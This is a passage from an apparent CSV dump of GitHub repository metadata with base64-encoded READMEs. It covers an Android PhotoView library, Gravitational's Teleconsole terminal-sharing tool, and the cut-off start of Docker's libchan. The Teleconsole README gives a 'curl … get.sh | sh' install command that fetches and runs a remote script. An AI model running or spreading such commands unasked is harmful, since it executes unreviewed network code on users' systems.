L2RlbW8yLmdpZikgIVtQaG90b1ZpZXddKC4vZGVtbzEuZ2lmKQoKI+azqOaE
jwrnlLHkuo5mYWNlYm9va+eahEZyZXNjb+WbvueJh+WKoOi9vee7hOS7tuaJ
gOWKoOi9veWHuuadpeeahGRyYXdhYmxl5Zu+54mH5bm26Z2e55yf5a6e55qE
ZHJhd2FibGUs5peg5rOV55u05o6l6I635Y+W5Zu+54mH55yf5a6e5a696auY
LOS5n+aXoOazleebtOaOpeWTjeW6lEltYWdlTWF0cml455qE5Y+Y5o2i77yM
CuS4lOagueaNrkZyZXNjb+aWh+aho+eahOS7i+e7jSzlnKjlkI7nu63nmoTn
iYjmnKzkuK0sRHJhd2VlVmlld+S8muebtOaOpee7p+aJv+iHqlZpZXcs5omA
5pyJ5pqC5LiN6ICD6JmR5pSv5oyBRnJlc2Nv44CCCuWvueS6juWFtuS7lues
rOS4ieaWueWbvueJh+WKoOi9veW6k+WmgkdsaWRlLEltYWdlTG9hZGVyLHhV
dGlsc+mDveaYr+aUr+aMgeeahAoKI+S9v+eUqAoxLkdyYWRsZea3u+WKoOS+
nei1liAo5o6o6I2QKQpgYGBncmFkbGUKZGVwZW5kZW5jaWVzIHsKICAgIGNv
bXBpbGUgJ2NvbS5ibS5waG90b3ZpZXc6bGlicmFyeToxLjQuMScKfQpgYGAK
KOaIluiAheS5n+WPr+S7peWwhumhueebruS4i+i9veS4i+adpe+8jOWwhklu
Zm8uamF2YeWSjFBob3RvVmlldy5qYXZh5Lik5Liq5paH5Lu25ou36LSd5Yiw
5L2g55qE6aG555uu5Lit77yM5LiN5o6o6I2QKQoKMi54bWzmt7vliqAKYGBg
eG1sCiA8Y29tLmJtLmxpYnJhcnkuUGhvdG9WaWV3CiAgICAgYW5kcm9pZDpp
ZD0iQCtpZC9pbWciCiAgICAgYW5kcm9pZDpsYXlvdXRfd2lkdGg9Im1hdGNo
X3BhcmVudCIKICAgICBhbmRyb2lkOmxheW91dF9oZWlnaHQ9Im1hdGNoX3Bh
cmVudCIKICAgICBhbmRyb2lkOnNjYWxlVHlwZT0iY2VudGVySW5zaWRlIgog
ICAgIGFuZHJvaWQ6c3JjPSJAZHJhd2FibGUvYml0bWFwMSIgLz4KYGBgCgoz
LmphdmHku6PnoIEKYGBgamF2YQpQaG90b1ZpZXcgcGhvdG9WaWV3ID0gKFBo
b3RvVmlldykgZmluZFZpZXdCeUlkKFIuaWQuaW1nKTsKLy8g5ZCv55So5Zu+
54mH57yp5pS+5Yqf6IO9CnBob3RvVmlldy5lbmFibGUoKTsKLy8g56aB55So
5Zu+54mH57yp5pS+5Yqf6IO9ICjpu5jorqTkuLrnpoHnlKjvvIzkvJrot5/m
ma7pgJrnmoRJbWFnZVZpZXfkuIDmoLfvvIznvKnmlL7lip/og73pnIDmiYvl
iqjosIPnlKhlbmFibGUoKeWQr+eUqCkKcGhvdG9WaWV3LmRpc2VuYWJsZSgp
OwovLyDojrflj5blm77niYfkv6Hmga8KSW5mbyBpbmZvID0gcGhvdG9WaWV3
LmdldEluZm8oKTsKLy8g5LuO5pmu6YCa55qESW1hZ2VWaWV35Lit6I635Y+W
SW5mbwpJbmZvIGluZm8gPSBQaG90b1ZpZXcuZ2V0SW1hZ2VWaWV3SW5mbyhJ
bWFnZVZpZXcpOwovLyDku47kuIDlvKDlm77niYfkv6Hmga/lj5jljJbliLDn
jrDlnKjnmoTlm77niYfvvIznlKjkuo7lm77niYfngrnlh7vlkI7mlL7lpKfm
tY/op4jvvIzlhbfkvZPkvb/nlKjlj6/ku6Xlj4LnhadkZW1v55qE5L2/55So
CnBob3RvVmlldy5hbmltYUZyb20oaW5mbyk7Ci8vIOS7jueOsOWcqOeahOWb
vueJh+WPmOWMluWIsOaJgOe7meWumueahOWbvueJh+S/oeaBr++8jOeUqOS6
juWbvueJh+aUvuWkp+WQjueCueWHu+e8qeWwj+WIsOWOn+adpeeahOS9jee9
ru+8jOWFt+S9k+S9v+eUqOWPr+S7peWPgueFp2RlbW/nmoTkvb/nlKgKcGhv
dG9WaWV3LmFuaW1hVG8oaW5mbyxuZXcgUnVubmFibGUoKSB7CiAgICAgICBA
T3ZlcnJpZGUKICAgICAgIHB1YmxpYyB2b2lkIHJ1bigpIHsKICAgICAgICAg
ICAvL+WKqOeUu+WujOaIkOebkeWQrAogICAgICAgfQogICB9KTsKLy8g6I63
5Y+WL+iuvue9riDliqjnlLvmjIHnu63ml7bpl7QKcGhvdG9WaWV3LnNldEFu
aW1hRHVyaW5nKGludCBkdXJpbmcpOwppbnQgZCA9IHBob3RvVmlldy5nZXRB
bmltYUR1cmluZygpOwovLyDojrflj5Yv6K6+572uIOacgOWkp+e8qeaUvuWA
jeaVsApwaG90b1ZpZXcuc2V0TWF4U2NhbGUoZmxvYXQgbWF4U2NhbGUpOwpm
bG9hdCBtYXhTY2FsZSA9IHBob3RvVmlldy5nZXRNYXhTY2FsZSgpOwovLyDo
rr7nva7liqjnlLvnmoTmj5LlhaXlmagKcGhvdG9WaWV3LnNldEludGVycG9s
YXRvcihJbnRlcnBvbGF0b3IgaW50ZXJwb2xhdG9yKTsKYGBgCgojIOWFs+S6
jgoK6Iul6YGH5Yiw5L2/55So5LiK55qE6Zeu6aKY77yM6K+35YWI57+755yL
SXNzdWVz77yM5aSn6YOo5YiG6Zeu6aKY5piv5bey57uP5pyJ5Lq65o+Q5Ye6
6L+H55qE44CCKOWmglsjOV0oaHR0cHM6Ly9naXRodWIuY29tL2JtLXgvUGhv
dG9WaWV3L2lzc3Vlcy85KSxbIzVdKGh0dHBzOi8vZ2l0aHViLmNvbS9ibS14
L1Bob3RvVmlldy9pc3N1ZXMvNSkpICAK6Iul5rKh5om+5Yiw55u45YWz55qE
6Zeu6aKY77yM5Y+v5Lul5YWI5ZyoSXNzdWVz5Lit5o+Q5Ye677yM6L+Z5qC3
5Lul5L6/5YW25LuW5Lq66YGH5Yiw5ZCM5qC36Zeu6aKY5pe25Y+v5b+r6YCf
5om+5Yiw562U5qGI44CCICAK6Iul6ZW/5pe26Ze05pyq5Zue5aSN77yM5Y+v
6YKu5Lu257uZ5oiRYm1tZUB2aXAucXEuY29tICAKCiMg54mI5pysCgp2MS40
LjAKICAgKiDlop7liqDlr7nmma7pgJpJbWFnZVZpZXfnmoTmlK/mjIHvvIzl
j6/pgJrov4dQaG90b1ZpZXfnmoTpnZnmgIHmlrnms5VnZXRJbWFnZVZpZXdJ
bmZvKEltYWdlVmlldynku47kuIDkuKrmma7pgJrnmoRJbWFnZVZpZXfkuK3o
jrflj5ZJbmZv77yM5Y+C54WnSW1hZ2VWaWV3QWN0aXZpdHkKICAgKiDmt7vl
iqDplb/mjInkuovku7bnmoTnm5HlkKzvvIxzZXRPbkxvbmdDbGlja0xpc3Rl
bmVyKCkKICAgKiDmj5Dpq5jlm77niYfnvKnmlL7liLDlsY/luZXovrnnvJjn
moTmg4XlhrXkuIvmu5HliqjnmoTmtYHnlYXmgKcKICAgKiDmlrDlop5nZXQv
c2V0QW5pbWFEdXJpbmcoKSBnZXQvc2V0TWF4U2NhbGUg6I635Y+W6K6+572u
5Yqo55S755qE5oyB57ut5pe26Ze05ZKM5Zu+54mH5pyA5aSn57yp5pS+5YCN
5pWwCiAgICog6YCa6L+Hc2V0SW50ZXJwb2xhdG9y5Y+v6K6+572u5Yqo55S7
5o+S5YWl5ZmoCiAgIAp2MS4zLjYKICAgKiDlop7liqDlm77niYfnmoTml4vo
vazlip/og70KICAgKiDniYjmnKzlj7flkb3lkI3mlLnlj5gKCnYyLjAuNwog
ICAqIOWuvemrmOWxnuaAp+WPr+S7peiuvue9ruS4undyYXBfY29udGVudO+8
jOa3u+WKoOWvuWFkanVzdFZpZXdCb3VuZHPlsZ7mgKfnmoTmlK/mjIEKICAg
KiDkv67lpI3mn5Dkupvmg4XlhrXkuIvkvJrpl6rliqgKICAgKiDlop7liqDl
r7lTY2FsZVR5cGUuRklUX1NUQVJULEZJVF9FTkTlr7lhbmltYUZyb23nmoTm
lK/mjIEKCnYyLjAuMCAgCiAgICog5re75YqgYW5pbWFUbyxhbmltYUZyb23m
lrnms5XvvIzmlK/mjIHlm77niYfngrnlh7vmlL7lpKfnvKnlsI/mtY/op4jl
ip/og70KICAgKiDmt7vliqBlbmFibGUoKeWSjGRpc2VuYWJsZSgpIOaJk+W8
gOWSjOWFs+mXreinpuaRuOe8qeaUvuaWueazle+8jOm7mOiupOaJk+W8gCAo
5b2T5pmu6YCaSW1hZ2VWaWV35L2/55So55qE5pe25YCZ5bu66K6u5YWz6Zet
6Kem5pG457yp5pS+5Yqf6IO9KQogICAqIOaUr+aMgeaJgOaciVNjYWxlVHlw
ZeWxnuaApwoKdjEuMAo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'teleconsole',66793564,b'Command line tool to share your UNIX terminal and forward local TCP ports to people you trust.',b'Go',33,2380,,2380,False,b'https://api.github.com/repos/gravitational/teleconsole/forks',"IyBUZWxlY29uc29sZQoKW1RlbGVjb25zb2xlXShodHRwczovL3d3dy50ZWxl
Y29uc29sZS5jb20vKSBpcyBhIGZyZWUgc2VydmljZSB0byBzaGFyZSB5b3Vy
IHRlcm1pbmFsIHNlc3Npb24gd2l0aCBwZW9wbGUgeW91IHRydXN0LiAKWW91
ciBmcmllbmRzIGNhbiBqb2luIHZpYSBhIGNvbW1hbmQgbGluZSB1c2luZyBT
U0ggb3IgYnkgdXNpbmcgdGhlaXIgYnJvd3Nlci4gVXNlIGl0IHdoZW4gdHdv
IHBhcnRpZXMgYXJlIHNlcGFyYXRlZCBieSBOQVQKYW5kIHlvdSBjYW5ub3Qg
Y29ubmVjdCB2aWEgU1NIIGRpcmVjdGx5LgoKIyMjIEluc3RhbGxpbmcKCkRv
d25sb2FkIHRoZSBsYXRlc3QgYmluYXJpZXMgZm9yIHlvdXIgcGxhdGZvcm0g
W2hlcmVdKGh0dHBzOi8vZ2l0aHViLmNvbS9ncmF2aXRhdGlvbmFsL3RlbGVj
b25zb2xlL3JlbGVhc2VzKSAKb3IgeW91IGNhbiBidWlsZCBpdCBmcm9tIHNv
dXJjZS4KClF1aWNrIGluc3RhbGxhdGlvbiBmb3IgdGhlIGltcGF0aWVudDoK
CmBgYApjdXJsIGh0dHBzOi8vd3d3LnRlbGVjb25zb2xlLmNvbS9nZXQuc2gg
fCBzaApgYGAKCiMjIyBRdWljayBTdGFydAoKU2ltcGx5IHR5cGUgYC4vdGVs
ZWNvbnNvbGVgIGluIHlvdXIgdGVybWluYWwgYW5kIHRoaXMgaXMgd2hhdCB5
b3Ugd2lsbCBzZWU6CgpgYGAKPiB0ZWxlY29uc29sZQpTdGFydGluZyBsb2Nh
bCBTU0ggc2VydmVyIG9uIGxvY2FsaG9zdC4uLgpSZXF1ZXN0aW5nIGEgZGlz
cG9zYWJsZSBTU0ggcHJveHkgZm9yIGVrb250c2V2b3kuLi4KQ2hlY2tpbmcg
c3RhdHVzIG9mIHRoZSBTU0ggdHVubmVsLi4uCgpZb3VyIFRlbGVjb25zb2xl
IElEOiAyOTM4MjkyM2E4NzAwNzUzMjQyMzNjNDkwODMxYTcKV2ViVUkgZm9y
IHRoaXMgc2Vzc2lvbjogaHR0cHM6Ly90ZWxlY29uc29sZS5jb20vcy8yOTM4
MjkyM2E4NzAwNzUzMjQyMzNjNDkwODMxYTcKVG8gc3RvcCBicm9hZGNhc3Rp
bmcsIGV4aXQgY3VycmVudCBzaGVsbCBieSB0eXBpbmcgJ2V4aXQnIG9yIGNs
b3NpbmcgdGhlIHdpbmRvdy4KYGBgCgpUZWxlY29uc29sZSB3aWxsIGxhdW5j
aCBhIG5ldyBzaGVsbCBzZXNzaW9uIGFuZCBwcmludCB0aGUgdW5pcXVlIHNl
c3Npb24gSUQgb2YgCmAyOTM4MjkyM2E4NzAwNzUzMjQyMzNjNDkwODMxYTdg
IHdoaWNoIHlvdSBuZWVkIHRvIHNoYXJlIHdpdGggeW91ciBmcmllbmQuIApZ
b3VyIGZyaWVuZCBjYW4gam9pbiBpbiBlaXRoZXIgYnkgY2xpY2tpbmcgb24g
YSBsaW5rLCBvciBieSB0eXBpbmc6IAoKYGBgCj4gdGVsZWNvbnNvbGUgam9p
biAyOTM4MjkyM2E4NzAwNzUzMjQyMzNjNDkwODMxYTcKYGBgCgpOb3cgeW91
IGFyZSBib3RoIHVzaW5nIHRoZSBzYW1lIHRlcm1pbmFsIHNlc3Npb24gcnVu
bmluZyBvbiB5b3VyIG1hY2hpbmUsIGV2ZW4gaWYgCmJvdGggb2YgeW91IGFy
ZSBvbiBzZXBhcmF0ZSBuZXR3b3JrcyBzZXBhcmF0ZWQgYnkgTkFULgoKWW91
IGNhbiB3YXRjaCBhIFtxdWljayB2aWRlb10oaHR0cHM6Ly93d3cueW91dHVi
ZS5jb20vd2F0Y2g/dj1SOENucm5xdVNfcyZ2cT1oZDEwODAmcmVsPTApIApv
ZiBob3cgdGhpcyB3b3Jrcy4gSGVyZSdzIHRoZSBzaW1wbGlmaWVkIGFuaW1h
dGlvbjoKCiFbVGVsZWNvbnNvbGUgYW5pbWF0aW9uXShkb2NzL2Z1bGwtc2Ny
ZWVuLXRlbGVjb25zb2xlLmdpZikKCgojIyMgV0FSTklORwoKUGxlYXNlIHVu
ZGVyc3RhbmQgdGhhdCBieSBydW5uaW5nIGB0ZWxlY29uc29sZWAgeW91IGFy
ZSB2aXJ0dWFsbHkgZ2l2aW5nIHRoZSBrZXlib2FyZCB0bwphbnlvbmUgd2l0
aCBhIGxpbmsuIFdlIG1hZGUgdGhlIHNlc3Npb24gSURzIHN1ZmZpY2llbnRs
eSBoYXJkIHRvIGd1ZXNzLCBidXQgKip5b3UgYXJlIHN0aWxsCnJ1bm5pbmcg
YW4gU1NIIHNlcnZlciBhY2Nlc3NpYmxlIHZpYSBwdWJsaWMgSW50ZXJuZXQq
KiBkdXJpbmcgdGhlIFRlbGVjb25zb2xlIHNlc3Npb24uCgoKIyMjIEVuZGlu
ZyB0aGUgU2Vzc2lvbgoKV2hlbiB5b3UncmUgZG9uZSB3aXRoIHRoZSBzZXNz
aW9uLCBtYWtlIHN1cmUgdG8gY2xvc2UgaXQgKHN0b3AgYHRlbGVjb25zb2xl
YCBwcm9jZXNzKQplaXRoZXIgYnkgdHlwaW5nIGBleGl0YCBpbiB0aGUgdGVy
bWluYWwgb3Igc2ltcGx5IGNsb3NpbmcgaXQuIFdoZW4gVGVsZWNvbnNvbGUg
ZXhpdHMsCnRoZSBvdXRib3VuZCBTU0ggdHVubmVsIGlzIGNsb3NlZCBhbmQg
eW91ciBtYWNoaW5lIGlzIG5vIGxvbmdlciBhY2Nlc3NpYmxlLgoKIyMjIFBv
cnQgRm9yd2FyZGluZwoKTGV0J3Mgc2F5IHlvdSBhcmUgZGV2ZWxvcGluZyBh
IHdlYiBhcHBsaWNhdGlvbiBhbmQgaXQgaXMgY3VycmVudGx5IHJ1bm5pbmcg
b24geW91ciAKYGxvY2FsaG9zdDo1MDAwYC4gWW91IGNhbiBtYWtlIGl0IGFj
Y2Vzc2libGUgYnkgeW91ciBmcmllbmRzIGlmIHlvdSBmb3J3YXJkIHBvcnQg
CmA1MDAwYCB0byB0aGVtOgoKYGBgCj4gdGVsZWNvbnNvbGUgLWYgbG9jYWxo
b3N0OjUwMDAKYGBgCgpXaGVuIHlvdXIgZnJpZW5kcyBqb2luIHRoaXMgc2Vz
c2lvbiwgdGhleSB3aWxsIHNlZSBzb21ldGhpbmcgbGlrZSB0aGlzOgoKYGBg
CkFUVEVOVElPTjogZWtvbnRzZXZveSBoYXMgaW52aXRlZCB5b3UgdG8gYWNj
ZXNzIHBvcnQgNTAwMCBvbiB0aGVpciBtYWNoaW5lIHZpYSBsb2NhbGhvc3Q6
OTAwMApgYGAKClNvIG5vdyB5b3VyIGZyaWVuZCBjYW4gY2xpY2sgb24gYGh0
dHA6Ly9sb2NhbGhvc3Q6OTAwMGAgdG8gYWNjZXNzIHlvdXIgYXBwbGljYXRp
b24uCgpCZWFyIGluIG1pbmQsIFRlbGVjb25zb2xlIGlzIGp1c3QgYW4gU1NI
IHNlcnZlciwgdGhpcyBtZWFucyB5b3VyIGZyaWVuZCBjYW4gcmVxdWVzdCAK
cG9ydCBmb3J3YXJkaW5nIHdpdGhvdXQgeW91ciBoZWxwLCBqdXN0IGxpa2Ug
YSByZWd1bGFyIFNTSCBjbGllbnQgd291bGQ6CgpgYGAKPiB0ZWxlY29uc29s
ZSAtZiA5MDAwOmxvY2FsaG9zdDo1MDAwIGpvaW4gPHNlc3Npb24taWQ+CmBg
YAoKIyMgSG93IGRvZXMgaXQgd29yaz8KClRlbGVjb25zb2xlIGlzIGJ1aWx0
IG9uIHRvcCBvZiBbR3Jhdml0YXRpb25hbCBUZWxlcG9ydF0oaHR0cDovL2dy
YXZpdGF0aW9uYWwuY29tL3RlbGVwb3J0KSAKd2hpY2ggaXMgYSBjbHVzdGVy
ZWQgU1NIIHNlcnZlciB3aXRoIGJ1aWx0LWluIFNTSCBiYXN0aW9uL3Byb3h5
LiBCb3RoIHByb2plY3RzIGFyZSAKb3BlbiBzb3VyY2UgYW5kIGhvc3RlZCBb
aGVyZSBvbiBHaXRIdWJdKGh0dHBzOi8vZ2l0aHViLmNvbS9ncmF2aXRhdGlv
bmFsL3RlbGVwb3J0L2Jsb2IvbWFzdGVyL1JFQURNRS5tZCkuCgpXaGF0IGhh
cHBlbnMgd2hlbiB5b3UgdHlwZSBgdGVsZWNvbnNvbGVgPwoKMS4gSXQgZ2Vu
ZXJhdGVzIHVuaXF1ZSBzaW5nbGUtdXNlIFNTSCBjcmVkZW50aWFscyBhbmQg
bGF1bmNoZXMgYW4gU1NIIHNlcnZlciBvbiBsb2NhbGhvc3QuIAogICBUaGVu
IFRlbGVjb25zb2xlIGxvZ3MgaW50byBpdHNlbGYsIGFuIGVxdWl2YWxlbnQg
b2YgYHNzaCBsb2NhbGhvc3RgLgoyLiBTU0ggY3JlZGVudGlhbHMgYXJlIFBP
U1RlZCB2aWEgSFRUUFMgdG8gYSBmcmVlIGFub255bW91cyBTU0ggcHJveHkg
b24gaHR0cHM6Ly90ZWxlY29uc29sZS5jb20uCjMuIFRoZSBzZXJ2ZXIgY3Jl
YXRlcyBhIHNpbmdsZS11c2UgZGlzcG9zYWJsZSBpbnN0YW5jZSBvZiBUZWxl
cG9ydCBTU0ggcHJveHksIHdoaWNoIGlzIAogICB0cnVzdGVkIGJ5IHRoZSBg
dGVsZWNvbnNvbGVgIFNTSCBzZXJ2ZXIgcnVubmluZyBvbiB5b3VyIG1hY2hp
bmUuIAo0LiBZb3VyIGxvY2FsIGB0ZWxlY29uc29sZWAgU1NIIHNlcnZlciBj
cmVhdGVzIGFuIG91dGJvdW5kIFNTSCB0dW5uZWwgdG8gdGhlIGRpc3Bvc2Fi
bGUgCiAgIFRlbGVwb3J0IHByb3h5IHJ1bm5pbmcgb24gaHR0cHM6Ly90ZWxl
Y29uc29sZS5jb20uIFRoZSBwcm94eSBub3cgYWN0cyBhcyBhIGJyaWRnZSBj
b25uZWN0aW5nCiAgIHRoZSBvdXRzaWRlIHdvcmxkIHRvIHlvdXIgbWFjaGlu
ZS4KCkFuZCBoZXJlIGlzIHdoYXQgaGFwcGVucyB3aGVuIHlvdSB0eXBlIGB0
ZWxlY29uc29sZSBqb2luIHNlc3Npb24taWRgOgoKPG9sIHN0YXJ0PSI1Ij4K
PGxpPnRlbGVjb25zb2xlIHJlcXVlc3RzIHRoZSBhbm9ueW1vdXMgcHJveHkg
Zm9yIFNTSCBrZXkgdG8gPGNvZGU+c2Vzc2lvbi1pZDwvY29kZT4gdmlhIEhU
VFBTLjwvbGk+CjxsaT5JdCB1c2VzIHRob3NlIGtleXMgdG8gU1NIIGludG8g
dGhlIHByb3h5LjwvbGk+CjxsaT5UaGUgcHJveHkgZm9yd2FyZHMgdGhlIGNv
bm5lY3Rpb24gdGhyb3VnaCB0aGUgdHVubmVsIGNyZWF0ZWQgaW4gc3RlcCAz
IHRvIHlvdXIgbWFjaGluZS48L2xpPgo8L29sPgoKIVtUZWxlY29uc29sZSBE
aWFncmFtXShkb2NzL3RlbGVjb25zb2xlLWRpYWdyYW0tdjIucG5nKQoKCiMj
IyBDTEkgUmVmZXJlbmNlCgpUeXBpbmcgYHRlbGVjb25zb2xlIGhlbHBgIGdl
dHMgeW91OgoKYGBgClVzYWdlOiB0ZWxlY29uc29sZSA8ZmxhZ3M+IDxjb21t
YW5kPgoKVGVsZWNvbnNvbGUgYWxsb3dzIHlvdSB0byBzdGFydCBhIG5ldyBz
aGVsbCBzZXNzaW9uIGFuZCBpbnZpdGUgeW91ciAKZnJpZW5kcyBpbnRvIGl0
LgoKU2ltcGx5IGNsb3NlIHRoZSBzZXNzaW9uIHRvIHN0b3Agc2hhcmluZy4K
CkZsYWdzOgogICAtZiBob3N0OnBvcnQgIEludml0ZSBqb2luaW5nIHBhcnRp
ZXMgdG8gY29ubmVjdCB0byBob3N0OnBvcnQKICAgLUwgc3BlYyAgICAgICBS
ZXF1ZXN0IHBvcnQgZm9yd2FyZGluZyB3aGVuIGpvaW5pbmcgYW4gZXhpc3Rp
bmcgc2Vzc2lvbgogICAtaW5zZWN1cmUgICAgIFdoZW4gc2V0LCB0aGUgY2xp
ZW50IHdpbGwgdHJ1c3QgaW52YWxpZCBTU0wgY2VydGlmYXRlcwogICAtdiAg
ICAgICAgICAgIFZlcmJvc2UgbG9nZ2luZwogICAtdnYgICAgICAgICAgIEV4
dHJhIHZlcmJvc2UgbG9nZ2luZyAoZGVidWcgbW9kZSkKICAgLXMgaG9zdDpw
b3J0ICBUZWxlY29uc29sZSBzZXJ2ZXIgYWRkcmVzcyBbdGVsZWNvbnNvbGUu
Y29tXQoKQ29tbWFuZHM6CiAgICBoZWxwICAgICAgICAgICAgICAgUHJpbnQg
dGhpcyBoZWxwCiAgICBqb2luIFtzZXNzaW9uLWlkXSAgSm9pbiBhY3RpdmUg
c2Vzc2lvbgoKRXhhbXBsZXM6CiAgPiB0ZWxlY29uc29sZSAtZiA1MDAwICAK
CiAgICBTdGFydHMgYSBzaGFyZWQgU1NIIHNlc3Npb24sIGFsc28gbGV0dGlu
ZyBqb2luaW5nIHBhcnRpZXMgYWNjZXNzIFRDUCAKICAgIHBvcnQgNTAwMCBv
biB5b3VyIG1hY2hpbmUuCgogID4gdGVsZWNvbnNvbGUgLWYgZ3Jhdml0YXRp
b25hbC5jb206ODAKCiAgICBTdGFydHMgYSBzaGFyZWQgU1NIIHNlc3Npb24s
IGZvcndhcmRpbmcgVENQIHBvcnQgODAgdG8gam9pbmluZyBwYXJ0aWVzLgog
ICAgVGhleSB3aWxsIGJlIGFibGUgdG8gdmlzaXQgaHR0cDovL2dyYXZpdGF0
aW9uYWwuY29tIHVzaW5nIHlvdXIgbWFjaGluZQogICAgYXMgYSBwcm94eS4K
CiAgPiB0ZWxlY29uc29sZSAtTCA1MDAwOmdyYXZpdGF0aW9uYWwuY29tOjgw
IGpvaW4gPHNlc3Npb24taWQ+CgogICAgSm9pbnMgdGhlIGV4aXN0aW5nIHNl
c3Npb24gcmVxdWVzdGluZyB0byBmb3J3YXJkIGdyYXZpdGF0aW9uYWwuY29t
OjgwCiAgICB0byBsb2NhbCBwb3J0IDUwMDAuCgpNYWRlIGJ5IEdyYXZpdGF0
aW9uYWwgSW5jIGh0dHA6Ly9ncmF2aXRhdGlvbmFsLmNvbQpgYGAKCiMjIFN1
cHBvcnQgZm9yIFByaXZhdGUgU1NIIEJhc3Rpb25zCgpTb21lIHBlb3BsZSBt
YXkgYmUgdW5jb21mb3J0YWJsZSB1c2luZyBwdWJsaWNseSBhY2Nlc3NpYmxl
IFNTSCBiYXN0aW9uIG9uIGh0dHBzOi8vdGVsZWNvbnNvbGUuY29tClRoZXkg
Y2FuIGRvIHRoZSBzYW1lIHRoaW5nIGJ5IHNldHRpbmcgdXAgYSBbVGVsZXBv
cnRdKGh0dHA6Ly9ncmF2aXRhdGlvbmFsLmNvbS90ZWxlcG9ydCkgYmFzdGlv
bgpvbiB0aGVpciBvd24gc2VydmVyLiAKCkluIGZhY3QsIFRlbGVwb3J0IHN1
cHBvcnRzIG1hbnkgbW9yZSBmZWF0dXJlcywgaW5jbHVkaW5nIHNlc3Npb24g
cmVjb3JkaW5nIGFuZCByZXBsYXksIApgc2NwYCBhbmQgaXMgY29tcGF0aWJs
ZSB3aXRoIE9wZW5TU0ggY2xpZW50LgoKIyMgUm9hZG1hcAoKQmVmb3JlIG9w
ZW4gc291cmNpbmcgaXQsIHdlIGhhdmUgYmVlbiB1c2luZyBUZWxlY29uc29s
ZSB3aXRoIGNsb3NlIGZyaWVuZHMgcXVpdGUgYSBiaXQuIApTbyBmYXIgdGhl
IHRvcCBmZWF0dXJlIHJlcXVlc3RzIGFyZToKCjEuIFJlYWQtb25seSBzZXNz
aW9uczogdGhpcyB3b3VsZCBhbGxvdyB5b3UgdG8gYnJvYWRjYXN0IG9ubHkg
dGhlIHBpY3R1cmUgb2YgeW91cgogICB0ZXJtaW5hbC4gUG9ydCBmb3J3YXJk
aW5nIGluIHRoaXMgbW9kZSB3b3VsZCBiZSBkaXNhYmxlZC4KMi4gQWJpbGl0
eSB0byBzZWUgd2hvJ3Mgdmlld2luZyB5b3VyIHNlc3Npb24uCjMuIEFkZGl0
aW9uYWwgcGFzc3dvcmQgYXV0aCBwZXIgc2Vzc2lvbi4KCldoYXQgZG8gKip5
b3UqKiB0aGluayB3ZSBzaG91bGQgYWRkIG5leHQ/IExldCB1cyBrbm93OiBg
aW5mb0BncmF2aXRhdGlvbmFsLmNvbWAKCiMjIEJ1aWxkaW5nIEZyb20gU291
cmNlCgpTZWUgW0JVSUxESU5HXShCVUlMRElORy5tZCkKCiMjIFdobyBCdWls
dCBUZWxlY29uc29sZT8KClRlbGVjb25zb2xlIGlzIGFuIGVhc3kgdG8gdXNl
IGRlbW8gb2YgW0dyYXZpdGF0aW9uYWwgVGVsZXBvcnRdKGh0dHA6Ly9ncmF2
aXRhdGlvbmFsLmNvbS90ZWxlcG9ydCksCmEgcHJvZHVjdCBjcmVhdGVkIGJ5
IFtHcmF2aXRhdGlvbmFsIEluY10oaHR0cHM6Ly9ncmF2aXRhdGlvbmFsLmNv
bSkuIFRlbGVwb3J0IGlzIGFuIG9wZW4gc291cmNlIApjb21wb25lbnQgb2Yg
b3VyIGNvbW1lcmNpYWwgb2ZmZXJpbmcgZm9yIGRlcGxveWluZyBhbmQgcmVt
b3RlbHkgW29wZXJhdGluZyBTYWFTIGFwcGxpY2F0aW9ucyBvbiB0b3Agb2Yg
CjNyZCBwYXJ0eSBlbnRlcnByaXNlIGluZnJhc3RydWN0dXJlXShodHRwczov
L2dyYXZpdGF0aW9uYWwuY29tL3Byb2R1Y3QpLiAKCkZvciBtb3JlIGluZm8s
IGRyb3AgdXMgYW4gZW1haWw6IFtpbmZvQGdyYXZpdGF0aW9uYWwuY29tXSht
YWlsdG86aW5mb0BncmF2aXRhdGlvbmFsLmNvbSkK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'libchan',20666775,b'Like Go channels over the network',b'Go',32,2380,,2380,False,b'https://api.github.com/repos/docker/libchan/forks',"IyBsaWJjaGFuOiBsaWtlIEdvIGNoYW5uZWxzIG92ZXIgdGhlIG5ldHdvcmsK
WyFbQ2lyY2xlIENJXShodHRwczovL2NpcmNsZWNpLmNvbS9naC9kb2NrZXIv
bGliY2hhbi5zdmc/c3R5bGU9c3ZnKV0oaHR0cHM6Ly9jaXJjbGVjaS5jb20v
Z2gvZG9ja2VyL2xpYmNoYW4pCgpMaWJjaGFuIGlzIGFuIHVsdHJhLWxpZ2h0
d2VpZ2h0IG5ldHdvcmtpbmcgbGlicmFyeSB3aGljaCBsZXRzIG5ldHdvcmsg
c2VydmljZXMgY29tbXVuaWNhdGUKaW4gdGhlIHNhbWUgd2F5IHRoYXQgZ29y
b3V0aW5lcyBjb21tdW5pY2F0ZSB1c2luZyBjaGFubmVsczoKCiogU2ltcGxl
IG1lc3NhZ2UgcGFzc2luZwoqIFN5bmNocm9uaXphdGlvbiBmb3IgY29uY3Vy
cmVudCBwcm9ncmFtbWluZwoqIE5lc3Rpbmc6IGNoYW5uZWxzIGNhbiBzZW5k
IGNoYW5uZWxzCgpMaWJjaGFuIHN1cHBvcnRzIHRoZSBmb2xsb3dpbmcgdHJh
bnNwb3J0cyBvdXQgb2YgdGhlIGJveDoKCiogSW4tbWVtb3J5IEdvIGNoYW5u
ZWwKKiBVbml4IHNvY2tldAoqIFJhdyBUQ1AKKiBUTFMKKiBIVFRQMi9TUERZ
CiogV2Vic29ja2V0CgpUaGlzIHByb3ZpZGVzIGdyZWF0IGZsZXhpYmlsaXR5
IGluIHNjYWxpbmcgYW4gYXBwbGljYXRpb24gYnkgYnJlYWtpbmcgaXQgZG93
